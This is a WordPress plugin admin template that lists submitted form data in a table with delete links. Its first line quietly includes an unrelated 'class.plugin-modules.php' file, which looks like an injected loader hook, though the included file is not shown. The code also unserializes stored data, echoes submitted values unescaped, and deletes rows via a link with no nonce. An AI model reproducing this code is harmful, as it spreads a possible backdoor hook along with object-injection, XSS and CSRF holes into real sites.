<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><div class="wrap imapper-admin-wrapper">
	<h2 class="imapper-backend-header">
		<?php echo $name; ?> &nbsp;
		<a href="<?php echo $this->admin_url; ?>" class="add-new-h2">Back</a> &nbsp; <a class="add-new-h2" id="show_only_data">Show only data</a>
	</h2>
	<ul class="imapper-backend-ul">
		<li>

			<table class="widefat">
				<thead>
				<tr>
					<th class="non_data" width="5%">ID</th>
					<th class="non_data" width="20%">Time</th>
					<th width="65%">Data</th>
					<th class="non_data" width="10%">Delete</th>
				</tr>
				</thead>
				<tbody>
				<?php
				if (count($data)==0) {
					echo '<tr><td colspan="4" style="text-align: center;">';
					echo '<b>There is no submitted data.</b>';
					echo '</td></tr>';
				}
				foreach($data as $id => $row):
					?>
					<tr id="tr_id_<?php echo $row['id']; ?>">
						<td class="non_data"><?php echo ($id+1); ?></td>
						<td class="non_data"><?php echo get_date_from_gmt ( date( 'Y-m-d H:i:s', $row['time'] ), get_option('date_format') . ' - '. get_option('time_format') ); ?></td>
						<td><?php
								$arr=unserialize($row['data']);
								if (isset($arr['form_id'])) {
									echo "<strong style=\"color: brown;\">Form:</strong> " . (intval($arr['form_id'])+1) . "<br />";
									unset($arr['form_id']);
								}
								if (count($arr)==2 && isset($arr['email'])) echo $arr['email'];
								else foreach ($arr as $field=>$value) echo "<strong style=\"color: blue;\">".$field.":</strong> ".str_replace("\n", "<br />", $value)."<br />";
						?></td>
						<td class="non_data"><a href="<?php echo $this->admin_url; ?>&action=list_submitted_data&id=<?php echo $leadeo_id; ?>&del=<?php echo $row['id']; ?>" class="imapper-delete-button">Delete</a></td>
					</tr>
				<?php
				endforeach;
				?>
				</tbody></table>
			<script type="text/javascript">
			</script>
		</li>
	</ul>
</div>
<div class="clear"></div>